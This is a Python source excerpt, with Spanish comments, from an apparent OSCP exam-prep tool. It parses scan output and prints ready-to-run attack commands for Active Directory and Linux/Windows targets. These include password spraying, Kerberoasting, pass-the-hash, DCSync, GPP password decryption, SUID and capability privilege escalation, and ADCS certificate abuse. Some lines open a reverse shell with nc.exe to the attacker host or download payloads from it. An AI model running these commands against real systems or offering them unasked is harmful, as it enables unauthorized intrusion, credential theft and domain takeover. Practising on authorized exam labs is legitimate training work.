     ["P2-03", "P2-04", "P2-07", "P2-08"], ["T1595"], ""),
    ("R02", "INFO", "Sistema Windows / Active Directory inferido", [r"Microsoft Windows|Domain:|cpe:/o:microsoft:windows|kerberos-sec"],
     "La presencia de Kerberos (88), LDAP (389/636/3268) y SMB (445) indica un Domain Controller: el objetivo es Domain Admin.",
     ["Sincroniza hora con el DC, Kerberos es sensible al reloj.", "Anade FQDN y dominio a /etc/hosts.", "Enumera usuarios y comprueba AS-REP/Kerberoasting."],
     ["sudo ntpdate -u {ip}", "echo '{ip} dc.{domain} {domain} dc' | sudo tee -a /etc/hosts", "kerbrute userenum -d {domain} --dc {ip} users.txt"],
     ["P0-05", "P0-06", "P9-01", "P9-05"], ["T1595", "T1087"], ""),
    ("R03", "CRITICO", "SMB signing requerido (relay bloqueado)", [r"Message signing enabled and required"],
     "NTLM relay no funcionara contra este host: no pierdas tiempo con responder/ntlmrelayx aqui. Busca credenciales o explotacion directa.",
     ["Descarta relay contra este equipo.", "Centrate en SMB unsigned de otros hosts o en robo de credenciales.", "Prueba PTH directo si consigues hashes."],
     ["nmap --script smb2-security-mode -p445 {ip}", "nxc smb {ip} -u users.txt -p passes.txt --continue-on-success", "nxc smb {ip} -u {user} -H {hash} --local-auth"],
     ["P2-11", "P9-18", "P9-25"], ["T1557"], ""),
    ("R04", "ALTO", "LDAP requiere bind autenticado", [r"successful bind must be completed|Operations error|LdapErr"],
     "El anonymous bind esta prohibido: necesitas un usuario. Las rutas tipicas son kerbrute, AS-REP, SMB nulo, shares o credenciales por defecto.",
     ["Extrae usuarios con kerbrute o windapsearch anonimo.", "Prueba AS-REP roast sin password.", "Revisa SMB shares y archivos de configuracion en busca de credenciales."],
     ["kerbrute userenum -d {domain} --dc {ip} users.txt", "impacket-GetNPUsers '{domain}/' -dc-ip {ip} -usersfile users.txt -no-pass", "windapsearch -d {domain} --dc {ip} -U"],
     ["P4-08", "P4-10", "P4-11", "P9-10"], ["T1087", "T1558"], ""),
    ("R05", "ALTO", "Acceso denegado en SMB / session setup failed", [r"NT_STATUS_ACCESS_DENIED|session setup failed"],
     "El null session no funciona. Prueba guest, usuarios locales, credenciales reutilizadas y password spray antes de descartar SMB.",
     ["Probar usuario guest con password vacia.", "Probar usuario=password y credenciales encontradas.", "Verificar politica de password y hacer spray limitado."],
     ["nxc smb {ip} -u guest -p ''", "nxc smb {ip} -u users.txt -p users.txt --no-bruteforce --continue-on-success", "nxc smb {ip} -u {user} -p 'Password1' --pass-pol"],
     ["P4-01", "P4-03", "P5-04"], ["T1110"], ""),
    ("R06", "ALTO", "Servicio web Apache/PHP identificado", [r"Apache httpd|Apache/|PHP/"],
     "Apache + PHP abre vectores de path traversal, LFI, upload y webshell. La version precise determina el CVE.",
     ["Anota la version exacta y buscala en searchsploit.", "Haz fuzz de directorios y extensiones.", "Prueba LFI,php://filter y metodos TRACE."],
     ["searchsploit 'Apache 2.4.48'", "feroxbuster -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -C 404 -t 50", "curl -s 'http://{ip}/?file=php://filter/convert.base64-encode/resource=index'"],
     ["P3-01", "P3-05", "P3-11"], ["T1190"], ""),
    ("R07", "ALTO", "Rutas web descubiertas por fuzzing", [r"\bffuf\b|\bgobuster\b|\bferoxbuster\b|\bdirsearch\b"],
     "Las rutas nuevas suelen contener el panel de administracion, uploads, backups o archivos de configuracion con credenciales.",
     ["Clasifica las rutas por codigo 200/301/302/403.", "Visita cada ruta y lee el codigo fuente.", "Prueba credenciales por defecto en los paneles encontrados."],
     ["grep -E '\\s(200|301|302)\\s' ffuf.txt | awk '{print $1}' | sort -u", "for f in robots.txt .git/HEAD .env backup.zip config.php; do curl -s -o /dev/null -w \"$f %{http_code}\\n\" http://{ip}/$f; done"],
     ["P3-02", "P3-04", "P3-09"], ["T1595"], ""),
    ("R08", "MEDIO", "Metodo TRACE habilitado", [r"Potentially risky methods: TRACE|TRACE"],
     "TRACE permite XSS del lado del cliente y puede ayudar a evadir cookies HttpOnly; no suele dar foothold directo.",
     ["Verifica si hay cookies sensibles.", "Comprueba configuracion del servidor y metodos permitidos."],
     ["curl -s -I -X TRACE http://{ip}", "curl -s -X TRACE -H 'X-Test: 1' http://{ip}"],
     ["P3-14"], ["T1059"], ""),
    ("R09", "MEDIO", "Certificado autofirmado / localhost", [r"commonName=localhost|self.signed|ssl-cert"],
     "El certificado no aporta identidad real, pero puede revelar nombres internos o indicar un servicio por defecto sin endurecer.",
     ["Extrae CN, SAN y correos del certificado.", "Prueba virtual hosts con los nombres encontrados."],
     ["echo | openssl s_client -connect {ip}:443 2>/dev/null | openssl x509 -noout -subject -text | grep -iE 'CN=|DNS:|email'", "ffuf -u https://{ip}/ -H 'Host: FUZZ.{domain}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"],
     ["P1-06", "P3-05", "P3-19"], ["T1592"], ""),
    ("R10", "ALTO", "WinRM disponible (5985/5986)", [r"5985/tcp|5986/tcp|Microsoft-HTTPAPI"],
     "WinRM es una via directa a shell remota si tienes credenciales o hash NTLM; suele ser el premio tras encontrar passwords.",
     ["Rocia las credenciales contra WinRM en todos los hosts.", "Usa evil-winrm con password o con hash.", "Si falla, verifica SMB signing y usa hash directo."],
     ["nxc winrm {ip} -u users.txt -p passes.txt --continue-on-success", "evil-winrm -i {ip} -u '{user}' -p '{pass}'", "evil-winrm -i {ip} -u {user} -H {hash}"],
     ["P4-22", "P9-18", "P9-23"], ["T1021"], ""),
    ("R11", "ALTO", "RPC / MSRPC expuesto", [r"135/tcp|ncacn_http|Microsoft Windows RPC"],
     "RPC permite enumerar usuarios, grupos y shares del dominio sin credenciales en algunos casos.",
     ["Enumera dominio con rpcclient nulo.", "Completa con enum4linux-ng."],
     ["rpcclient -U '' -N {ip} -c 'enumdomusers;enumdomgroups;netshareenumall'", "enum4linux-ng -A {ip} -oJ nmap/enum4linux"],
     ["P4-13", "P4-04"], ["T1087"], ""),
    ("R12", "ALTO", "Kerberos / kpasswd expuesto", [r"88/tcp|kerberos-sec|464/tcp"],
     "Permite user enumeration, AS-REP roasting y Kerberoasting, ademas de exigir sincronizacion horaria.",
     ["Sincroniza reloj.", "Enumera usuarios y prueba AS-REP sin credenciales.", "Con credenciales, kerberoastea y crackea."],
     ["sudo ntpdate -u {ip}", "kerbrute userenum -d {domain} --dc {ip} users.txt", "impacket-GetNPUsers '{domain}/' -dc-ip {ip} -usersfile users.txt -no-pass"],
     ["P4-10", "P4-11", "P4-12", "P9-11"], ["T1558"], ""),
    ("R13", "INFO", "Solo se han visto escaneos, sin acceso", [r"Starting Nmap|Nmap scan report"],
     "Aun no hay evidencia de explotacion: el siguiente paso es enumeracion por servicio antes de elegir vector.",
     ["Ordena los puertos por probabilidad de foothold: 80/443, 445, 5985, 21, 22.", "Ejecuta los playbooks de servicio.", "Documenta cada version encontrada."],
     ["nmap -sV -sC -p 80,443,445,5985 {ip}", "nxc smb {ip} -u '' -p ''; nxc smb {ip} -u guest -p ''"],
     ["P2-07", "P4-01"], ["T1595"], ""),
    ("R14", "ALTO", "Escaneo UDP requerido", [r"@tool:masscan|@tool:nmap"],
     "Los servicios UDP (SNMP 161, DNS 53, NFS 2049) suelen omitirse y son una fuente frecuente de credenciales y rutas.",
     ["Escanea UDP top 100/1000.", "Prueba community strings de SNMP."],
     ["sudo nmap -Pn -sU --top-ports=100 -oN nmap/udp.txt {ip}", "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {ip}"],
     ["P2-02", "P4-14"], ["T1595"], ""),
    ("R15", "ALTO", "Hashes capturados", [r"[0-9a-fA-F]{32}:[0-9a-fA-F]{32}|NTLM|\$6\$|sha256:"],
     "Los hashes son credenciales reutilizables: crackearlos o usarlos con Pass-the-Hash abre movimiento lateral.",
     ["Identifica el tipo de hash con hashid.", "Intenta crack con rockyou; si falla, usa PtH directo.", "Anade cada resultado a la tabla de credenciales y rocialo."],
     ["hashid hashes.txt", "john hashes.txt -w=/usr/share/wordlists/rockyou.txt", "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt", "nxc smb {ip} -u {user} -H {hash} --continue-on-success"],
     ["P6-10", "P9-12", "P9-18"], ["T1003", "T1550"], "OSCP: hashcat/john permitidos; no uses herramientas comerciales"),
    ("R16", "CRITICO", "Credenciales en texto plano encontradas", [r"password\s*[:=]|passwd\s*[:=]|Password1|Welcome1|admin:admin|cpassword"],
     "Una credencial nueva reinicia el ciclo: probarla en todos los servicios y hosts es la accion de mayor rendimiento.",
     ["Anade usuario:password a tu tabla.", "Rocia en SMB, WinRM, RDP, MSSQL y SSH de toda la subnet.", "Con acceso, repite enumeracion como ese usuario."],
     ["echo '{user}:{pass}' >> creds.txt", "nxc smb {ip}/24 -u users.txt -p passes.txt --continue-on-success", "nxc winrm {ip}/24 -u users.txt -p passes.txt --continue-on-success", "nxc rdp {ip}/24 -u users.txt -p passes.txt --continue-on-success"],
     ["P6-08", "P6-09", "P9-13"], ["T1110", "T1078"], ""),
    ("R17", "CRITICO", "GPP cpassword en SYSVOL", [r"cpassword|Groups\.xml|SYSVOL"],
     "Las Group Policy Preferences guardaban passwords cifrados con una clave publica conocida: descifrarlos da credenciales de dominio.",
     ["Descarga SYSVOL completa.", "Busca Groups.xml y extrae cpassword.", "Descifra y comprueba si el usuario sigue activo."],
     ["smbclient //{ip}/SYSVOL -U {user} -c 'recurse;prompt OFF;mget *'", "find . -name Groups.xml -exec grep -i cpassword {} +", "gpp-decrypt 'VALUE'"],
     ["P9-07", "P9-08", "P9-09"], ["T1552"], ""),
    ("R18", "CRITICO", "Salida de bloodhound / SharpHound", [r"@tool:sharphound|@tool:bloodhound|neo4j"],
     "BloodHound convierte permisos de AD en rutas explotables: el camino mas corto a Domain Admin suele estar a un clic.",
     ["Sube los datos y abre Neo4j + BloodHound.", "Ejecutaqueries de shortest path a Domain Admins.", "Busca sessions de usuarios privilegiados y edge de ACL exploitable."],
     ["neo4j console & bloodhound &", "MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p", "MATCH p=(c:Computer)-[:HasSession]->(m:User) RETURN p"],
     ["P9-02", "P9-03", "P9-04", "P9-16"], ["T1087"], ""),
    ("R19", "ALTO", "AS-REP roastable / kerberoasteable", [r"GetNPUsers|ASREP|GetUserSPNs|kerberoast"],
     "Estos tickets contienen hashes cifrados con la password del usuario: crackearlos offline no bloquea la cuenta.",
     ["Guarda el ticket/hash en un archivo.", "Crackea con hashcat john.", "Usa la password conseguida para spray yPTH."],
     ["impacket-GetNPUsers '{domain}/' -dc-ip {ip} -usersfile users.txt -no-pass -outputfile asrep.txt", "impacket-GetUserSPNs '{domain}/{user}:{pass}' -dc-ip {ip} -request -outputfile spn.txt", "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt", "hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt"],
     ["P9-10", "P9-11", "P9-12"], ["T1558"], ""),
    ("R20", "CRITICO", "secretsdump / DCSync ejecutado", [r"@tool:secretsdump|dcsync|just-dc"],
     "Con hashes de dominio ya puedes alcanzar Domain Admin mediante Pass-the-Hash sin necesidad de crackear.",
     ["Filtra el hash de Administrator/KRBTGT.", "Conectate al DC con evil-winrm usando -H.", "Captura proof.txt y documenta."],
     ["impacket-secretsdump -just-dc-user Administrator '{domain}/{user}:{pass}'@{ip}", "evil-winrm -i {ip} -u administrator -H {hash}", "type C:\\Users\\Administrator\\Desktop\\proof.txt"],
     ["P6-10", "P9-22", "P9-23"], ["T1003", "T1021"], ""),
    ("R21", "ALTO", "Sesion WinRM / shell remoto conseguida", [r"evil-winrm|meterpreter|PS C:\\|C:\\>|root@|# whoami"],
     "Con shell hay que ejecutar siempre la misma secuencia: identidad, evidencia, herramientas, loot, privesc.",
     ["Ejecuta whoami/hostname/ip y guarda screenshot.", "Descarga las flags.", "Sube herramientas y busca credenciales."],
     ["whoami; hostname; ipconfig", "find / -name 'local.txt' -o -name 'proof.txt' 2>/dev/null", "certutil -urlcache -f http://{kali}/winpeas.exe C:\\Windows\\Temp\\winpeas.exe"],
     ["P6-01", "P6-02", "P6-03", "P6-04"], ["T1059"], "OSCP: Metasploit/Meterpreter solo en UNA maquina del examen"),
    ("R22", "CRITICO", "sudo -l muestra permisos", [r"sudo -l|may run the following commands"],
     "Cualquier entrada de sudo es potencial root via GTFOBins; es el primer vector de privesc Linux.",
     ["Copia cada comando/binary permitido.", "Buscalo en GTFOBins.", "Prueba el vector mas directo (sin password primero)."],
     ["sudo -l", "echo 'https://gtfobins.github.io' ; sudo -l | grep -oE '/[a-zA-Z0-9_/-]+'", "sudo /usr/bin/vim -c ':!/bin/sh'"],
     ["P7-01", "P7-13"], ["T1068"], ""),
    ("R23", "ALTO", "Binarios SUID identificados", [r"SUID|perm -u=s|-rwsr"],
     "Un binario SUID con tecnica GTFOBins conocida suele ser escalada directa a root.",
     ["Lista todos los SUID.", "Compara con GTFOBins.", "Prioriza binarios raros o propios."],
     ["find / -perm -u=s -type f 2>/dev/null", "find / -perm -4000 -type f 2>/dev/null | while read f; do echo \"== $f\"; done", "echo 'https://gtfobins.github.io'"],
     ["P7-02", "P7-13"], ["T1068"], ""),
    ("R24", "ALTO", "Capabilities de archivos", [r"getcap|cap_setuid|cap_dac_override|cap_sys_admin"],
     "cap_setuid o cap_dac_override en un interprete equivale a root sin necesidad de SUID.",
     ["Lista capabilities del sistema.", "Busca interpretes (python, perl, php, vim).", "Aplica la tecnica GTFOBins correspondiente."],
     ["getcap -r / 2>/dev/null", "/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
     ["P7-03"], ["T1068"], ""),
    ("R25", "ALTO", "Cron jobs / tareas programadas", [r"/etc/crontab|cron.d|crontab -l|schtasks"],
     "Un script ejecutado por root de forma periodica y modificable da root en minutos.",
     ["Lee crontab y directorios cron.", "Comprueba permisos de los scripts.", "Corre pspy para ver procesos que no salen en crontab."],
     ["cat /etc/crontab; ls -la /etc/cron.d/; crontab -l", "./pspy64 -pf -i 1000", "schtasks /query /fo LIST /v"],
     ["P7-04", "P7-05", "P8-11"], ["T1053"], ""),
    ("R26", "CRITICO", "SeImpersonate / SeDebug detectado", [r"SeImpersonatePrivilege|SeDebugPrivilege|SeBackupPrivilege"],
     "Con SeImpersonate puedes suplantar a SYSTEM con PrintSpoofer/GodPotato: practicamente root en Windows.",
     ["Verifica el privilegio exacto con whoami /priv.", "Elige potato segun la version del sistema.", "Ejecuta la carga util y confirma whoami."],
     ["whoami /priv", "PrintSpoofer.exe -i -c cmd", "GodPotato-NET4.exe -cmd 'C:\\Windows\\Temp\\nc.exe {kali} 443 -e cmd.exe'"],
     ["P8-03", "P8-04", "P8-13"], ["T1068"], ""),
    ("R27", "ALTO", "Ruta de servicio sin comillas / modificable", [r"Unquoted|Modifiable|wmic service|sc qc"],
     "Los servicios con espacios sin comillas o binarios modificables permiten ejecutar codigo con SYSTEM.",
     ["Lista servicios en modo auto con rutas con espacios.", "Comprueba permisos con accesschk.", "Sustituye el binario o crea el ejecutable intermedio."],
     ["wmic service get name,pathname,startmode | findstr /i 'auto'", "sc qc SERVICE_NAME", "accesschk.exe -uwcqv USUARIO *"],
     ["P8-05", "P8-06"], ["T1068"], ""),
    ("R28", "ALTO", "Historial de PowerShell con secretos", [r"ConsoleHost_history|PSReadLine|Get-Content.*history"],
     "El historial de PS suele contener passwords, comandos de conexion y rutas de credenciales olvidadas.",
     ["Lee el historial del usuario actual y de otros usuarios.", "Extrae credenciales y repite el ciclo."],
     ["type C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", "Get-ChildItem C:\\Users\\*\\AppData -Recurse -Include *.txt,*.xml,*.config -Force -EA SilentlyContinue | Select-String password -List"],
     ["P8-08", "P8-19"], ["T1552"], ""),
    ("R29", "MEDIO", "Segunda interfaz de red detectada", [r"\beth1\b|\beth2\b|172\.16\..*\beth|10\.\d+\.\d+\..*\beth"],
     "La victima alcanza una red que tu Kali no ve: necesitas un pivot SOCKS antes de seguir enumerando.",
     ["Confirma las rutas de la victima.", "Levanta chisel server en modo reverse.", "Configura proxychains y vuelve a fase 1."],
     ["ip a; ip route; route print", "./chisel server -p 9999 --reverse &", "./chisel client {kali}:9999 R:socks", "proxychains -q nmap -sT -Pn -p80,445,5985 {ip}"],
     ["P10-01", "P10-02", "P10-03", "P10-04", "P10-05"], ["T1021"], ""),
    ("R30", "ALTO", "Servicio escuchando en localhost", [r"127\.0\.0\.1:[0-9]+|LocalAddress"],
     "Un servicio solo-local no es alcanzable desde Kali: reenvialo con chisel o interactua desde la propia victima.",
     ["Identifica el puerto y el proceso.", "Prueba a interactuar desde la victima primero.", "Reenvia el puerto a Kali con chisel."],
     ["netstat -ano | findstr LISTENING", "Get-NetTCPConnection -State Listen | Select LocalPort,OwningProcess", "./chisel client {kali}:9999 R:9090:127.0.0.1:8080", "curl -s http://127.0.0.1:9090"],
     ["P6-06", "P10-06", "P10-09"], ["T1021"], ""),
    ("R31", "MEDIO", "Salida de nmap sin puertos abiertos", [r"Not shown: 65535 closed|All 65535 scanned ports|0 hosts up|Host is down"],
     "Si no hay puertos, revisa conectividad, IPv6, UDP o un firewall; no asumas que el objetivo esta caido.",
     ["Verifica ping y ruta.", "Prueba -Pn y -sU.", "Prueba IPv6 y otros protocolos."],
     ["ping -c 2 {ip}; ip route", "sudo nmap -Pn -sT -p- --min-rate=1000 {ip}", "sudo nmap -Pn -sU --top-ports=100 {ip}", "nmap -6 {ip}"],
     ["P0-02", "P2-02", "P2-09"], ["T1595"], ""),
    ("R32", "ALTO", "Herramienta de password attack ejecutada", [r"@tool:hydra|@tool:medusa|@tool:john|@tool:hashcat"],
     "Valida que el usuario sea conocido y controla el ritmo de intentos; cada credencial obtenida debe probarse en todos los servicios.",
     ["Confirmar usuario valido antes de lanzar la herramienta.", "Usar wordlists dirigidas y reglas basicas.", "Anadir aciertos a la tabla y rociar."],
     ["hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4", "john hashes.txt -w=/usr/share/wordlists/rockyou.txt", "nxc smb {ip} -u {user} -p passes.txt --continue-on-success"],
     ["P5-04", "P5-12", "P9-12"], ["T1110"], ""),
    ("R33", "ALTO", "MySQL / MSSQL / Redis accesible", [r"\bMySQL\b|\bMSSQL\b|\bRedis\b|3306/tcp|1433/tcp|6379/tcp"],
     "Las bases de datos sin autenticacion permiten leer credenciales de la propia aplicacion o ejecutar comandos del sistema.",
     ["Comprueba acceso sin password y credenciales por defecto.", "Busca tablas de usuarios y hardening de la aplicacion.", "En MSSQL prueba xp_cmdshell; en MySQL UDF; en Redis escritura de archivos."],
     ["mysql -h {ip} -u root -e 'SHOW DATABASES;'", "impacket-mssqlclient {user}@{ip} -windows-auth", "redis-cli -h {ip} CONFIG GET dir", "nxc mssql {ip} -u sa -p Password1"],
     ["P4-18", "P4-19", "P4-20", "P8-20"], ["T1078"], ""),
    ("R34", "MEDIO", "Zone transfer DNS posible", [r"AXFR|zone transfer|@tool:dig"],
     "Una transferencia de zona revela todos los nombres internos y ayuda a construir la lista de usuarios y hosts.",
     ["Intenta AXFR contra el DC.", "Guarda los nombres y anadelos a /etc/hosts.", "Genera wordlist de usuarios con los nombres."],
     ["dig axfr @{ip} {domain}", "dnsrecon -d {domain} -n {ip} -t std", "awk '{print $1}' zonas.txt | sort -u > users.txt"],
     ["P1-04", "P1-05", "P1-09"], ["T1590"], ""),
    ("R35", "ALTO", "Nikto / WPScan / CMS scanner con hallazgos", [r"@tool:nikto|@tool:wpscan|@tool:droopescan|OSVDB|WordPress"],
     "Los escaneadores de web encuentran versiones y plugins vulnerables, pero cada hallazgo debe validarse manualmente.",
     ["Extrae versiones de plugins/temas y buscalas en searchsploit.", "Comprueba la ruta del hallazgo con curl.", "Busca credenciales por defecto del plugin."],
     ["wpscan --url http://{ip} --enumerate p,u --plugins-detection aggressive", "searchsploit 'plugin version'", "curl -s http://{ip}/wp-content/plugins/"],
     ["P3-08", "P3-09"], ["T1190"], "OSCP: Nikto/WPScan permitidos; el escaneo automatico de Nessus/comerciales no"),
    ("R36", "INFO", "IP local de Kali / tun0 detectada", [r"tun0|192\.168\.45\.|ip a"],
     "Necesitas la IP correcta de tu interfaz VPN para reverse shells y transferencias; no uses la IP de eth0 si el objetivo esta en tun0.",
     ["Identifica la IP que ve al objetivo.", "Guardo como LHOST en el perfil.", "Genera payloads con esa IP."],
     ["ip -4 addr show tun0 | grep inet | awk '{print $2}' | cut -d/ -f1", "rlwrap nc -lvnp 443"],
     ["P0-02", "P5-05", "P5-07"], ["T1071"], ""),
    ("R37", "ALTO", "LinPEAS/WinPEAS ejecutado", [r"@tool:linpeas|@tool:winpeas"],
     "No leas toda la salida: filtra rojo/amarillo y las secciones que realmente escalan.",
     ["Guarda la salida en archivo.", "Filtra por secciones clave.", "Verifica cada hallazgo antes de lanzar el exploit."],
     ["grep -A5 -E '\\x1b\\[(91|93|31|33)m|\\[1\\]' linpeas.txt", "grep -iE 'SeImpersonate|Unquoted|Modifiable|AlwaysInstall|AutoLogon|password|credential' winpeas.txt | sort -u", "grep -B2 -A5 'password\\|credential' linpeas.txt"],
     ["P7-06", "P8-03", "P8-04"], ["T1087"], ""),
    ("R38", "CRITICO", "Archivos local.txt/proof.txt localizados", [r"local\.txt|proof\.txt|user\.txt"],
     "Recuerda capturar la flag con la evidencia de identidad en la misma pantalla: sin screenshot la flag no puntua.",
     ["Muestra whoami, hostname, IP y flag juntos.", "Guarda una copia de la flag en tu maquina.", "Anota la maquina y el tipo de flag."],
     ["whoami; hostname; ip a; cat /root/proof.txt", "whoami; hostname; ipconfig; type C:\\Users\\Administrator\\Desktop\\proof.txt", "cat local.txt | tee proof/local_$(hostname).txt"],
     ["P6-03", "P11-01", "P11-02", "P11-07"], ["T1005"], ""),
    ("R39", "ALTO", "FTP anonimo / servicio de archivos", [r"220 .*FTP|anonymous|@tool:ftp|@tool:showmount"],
     "El anonymous FTP o NFS sin squash permite subir webshells o leer archivos del sistema.",
     ["Comprueba si el directorio es escribible y si coincide con la web root.", "Sube una pagina de prueba y verificala por HTTP.", "Descarga archivos interesantes."],
     ["ftp {ip}", "showmount -e {ip}", "curl -s http://{ip}/test.txt"],
     ["P4-16", "P4-17", "P5-09"], ["T1190"], ""),
    ("R40", "MEDIO", "Responder / LLMNR observado", [r"@tool:responder|LLMNR|NBT-NS|mitm6"],
     "Responder captura hashes NTLM de nombres NetBIOS no resueltos; recuerda que SMB signing requerido bloquea el relay.",
     ["Comprueba si el host tiene SMB signing.", "Captura hashes y decide crack vs relay.", "Usa los hashes en PtH."],
     ["sudo responder -I tun0 -A", "nmap --script smb2-security-mode -p445 {ip}", "hashcat -m 1000 captura.txt /usr/share/wordlists/rockyou.txt"],
     ["P9-14", "P9-25"], ["T1557"], ""),
    ("R41", "CRITICO", "ADCS / certipy vulnerable detectado", [r"@tool:certipy|ADCS|ESC1|ESC4|ESC9|certificate template"],
     "Una plantilla de certificados mal configurada permite obtener un ticket de administrador en segundos.",
     ["Lista plantillas vulnerables.", "Identifica el template y el account.", "Solicita certificado y usa el ticket con PKINITtools."],
     ["certipy-ad find -u {user} -p '{pass}' -dc-ip {ip} -vulnerable -stdout", "certipy-ad req -u {user} -p '{pass}' -ca CA -template TEMPLATE -upn administrator@{domain} -dc-ip {ip}", "impacket-getTGT '{domain}/administrator' -pfx administrator.pfx"],
     ["P9-15"], ["T1649"], ""),
    ("R42", "INFO", "Salida no reconocida / generica", [],
     "No se han encontrado firmas conocidas, pero puede haber datos utiles: direcciones IP, rutas, nombres o mensajes de error.",
     ["Extrae automaticamente IPs, rutas, correos y posibles credenciales.", "Guarda la salida cruda en un archivo para el reporte.", "Si es un error, busca el mensaje exacto en google y vuelve a enumerar."],
     ["grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' salida.txt | sort -uV", "grep -iE 'error|denied|invalid|not found|version' salida.txt | sort -u", "grep -oE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+' salida.txt | sort -u"],
     ["P1-10"], ["T1595"], ""),
]

RESTR_FLAGS = {
    "OSCP: 1 maquina": (YEL + B, "[OSCP 1-MAQUINA]"),
    "OSCP: NO PERMITIDO": (RED + B, "[OSCP NO PERMITIDO]"),
}


def fill(t, f):
    v = dict(f)
    v.setdefault("port", "80")
    defaults = {"port": "80", "share": "share", "url": "http://" + (f.get("ip") or "<IP>"), "path": "/", "hash": "<HASH>", "lport": "443", "dc": f.get("ip") or "<IP>"}
    for k, val in defaults.items():
        v.setdefault(k, val)
    v["pass"] = v.get("password", "")
    for k in ("ip", "kali", "domain", "user", "password", "pass", "port", "share", "url", "hash", "lport", "dc", "path"):
        t = t.replace("{" + k + "}", str(v.get(k) or ("<" + k.upper() + ">")))
    return t


def render_facts(f, tools):
    section("DATOS EXTRAIDOS DE LA SALIDA", BGB)
    sub(paint("Objetivo: ", B) + paint(f["ip"] or "<sin configurar>", YEL) + paint("   Kali/LHOST: ", B) + paint(f["kali"] or "<sin configurar>", YEL) + paint("   Dominio: ", B) + paint(f["domain"] or "<desconocido>", YEL))
    sub(paint("SO: ", B) + (f["os"] or "no detectado") + paint("   Host: ", B) + (f["host"] or "no detectado") + paint("   SMB signing: ", B) + (f["signing"] or "no detectado"))
    if tools:
        sub(paint("Herramientas detectadas (", D) + paint(", ".join(tools), CYN) + paint("):", D) + paint(f" {len(tools)}", B))
    if f["ports"]:
        sub(paint("Puertos / servicios:", B))
        keys = sorted(f["ports"], key=lambda x: int(x))
        for p in keys:
            info = f["ports"][p]
            ver = info["version"]
            if len(ver) > 78:
                ver = ver[:75] + "..."
            sub(paint(f"  {p}/{info['proto']:<3} {info['state']:<6} ", GRN if info["state"] == "open" else YEL) + paint(info["svc"], CYN) + paint("  " + ver if ver else "", D))
    if f["users"]:
        sub(paint("Usuarios: ", B) + ", ".join(f["users"][:20]))
    if f["creds"]:
        sub(paint("Posibles credenciales: ", BGR + WHT) + ", ".join(f["creds"][:10]))
    if f["hashes"]:
        sub(paint("Hashes: ", BGR + WHT) + ", ".join(f["hashes"][:4]))
    if f["webpaths"]:
        sub(paint("Rutas web (200/30x): ", B) + ", ".join(f["webpaths"][:10]))
    if f["ips"]:
        sub(paint("IPs vistas: ", B) + ", ".join(f["ips"][:12]))


def render_block(r, f):
    rid, sev, title_txt, trig, why, steps, cmds, checks, mitre, restr = r
    code, label = SEV.get(sev, SEV["INFO"])
    out("")
    out(paint("  " + label + "  ", code) + paint(title_txt, B))
    sub(paint("Por que: ", B) + why)
    sub(paint("Que haria:", B))
    for i, s in enumerate(steps, 1):
        sub(paint(f"   {i}. ", YEL) + s)
    if cmds:
        sub(paint("Comandos listos para ejecutar:", B))
        for c in cmds:
            cmdline(fill(c, f))
            if restr:
                rc, rtag = RESTR_FLAGS.get(restr, (YEL, restr))
                out(paint("      " + rtag, rc))
    if mitre:
        sub(paint("MITRE ATT&CK: ", D) + ", ".join(mitre))


def analyze_text(text, sess, verbose=True):
    tools = detect_tools(text)
    f = extract_facts(text, sess)
    low = text.lower()
    matched = []
    for r in RULES:
        hit = False
        for t in r[3]:
            if t.startswith("@tool:"):
                if t[6:].lower() in [x.lower() for x in tools]:
                    hit = True
                    break
            else:
                try:
                    if re.search(t, text, re.I | re.M):
                        hit = True
                        break
                except re.error:
                    pass
        if hit:
            matched.append(r)
    if not matched:
        matched.append(RULES[-1])
    seen = set()
    matched = [r for r in matched if not (r[0] in seen or seen.add(r[0]))]
    order = {"CRITICO": 0, "ALTO": 1, "MEDIO": 2, "BAJO": 3, "INFO": 4}
    matched.sort(key=lambda r: order.get(r[1], 9))
    if verbose:
        title("ANALISIS DE SALIDA / MOTOR DE DECISION", BGM)
        render_facts(f, tools)
        section("VECTORES Y HOJA DE RUTA", BGR)
        for r in matched[:12]:
            render_block(r, f)
        vhits = []
        for pat, cve, desc, cmds in VULN_HINTS:
            if re.search(pat, text, re.I):
                vhits.append((cve, desc, cmds))
        if vhits:
            section("CORRELACION DE VERSIONES / CVE SUGERIDOS", BGY)
            for cve, desc, cmds in vhits:
                out("")
                sub(paint(cve, BGR + WHT) + "  " + paint(desc, YEL))
                for c in cmds:
                    cmdline(fill(c, f))
        if f["ports"]:
            section("PLAYBOOK POR PUERTO ABIERTO", BGB)
            keys = sorted([p for p in f["ports"] if f["ports"][p]["state"] == "open"], key=lambda x: int(x))
            for p in keys[:14]:
                if p in SERVICE_PLAYBOOK:
                    name, cmds = SERVICE_PLAYBOOK[p]
                    sub(paint(f"[{p}] {name}", YEL + B))
                    for c in cmds:
                        cmdline(fill(c, f))
        section("BASH ONE-LINERS PARA LIMPIAR / FILTRAR SALIDA", BGC)
        for label, c in CLEANERS[:10]:
            sub(paint(label + ": ", B) + paint(c, CYN))
        section("CONCLUSION Y PRIORIDAD", BGM)
        for i, r in enumerate(matched[:3], 1):
            sub(paint(f"{i}. ", YEL + B) + paint(r[2], B) + paint(" :: " + r[4], D))
        if f["domain"] and any(x in f["ports"] for x in ("88", "389", "445")):
            warn(paint("Objetivo AD detectado: ejecuta BloodHound en cuanto tengas el primer usuario.", YEL))
        if f["signing"] == "required":
            warn(paint("SMB signing requerido: descarta NTLM relay contra este host.", YEL))
        if not f["ip"]:
            warn(paint("Sin IP objetivo configurada: usa la opcion 1 antes de copiar comandos.", YEL))
    auto = auto_check(text, tools, sess)
    if verbose and auto:
        section("AUTO-CHECK DEL CHECKLIST", BGG)
        for i in auto:
            ok(paint(i, GRN))
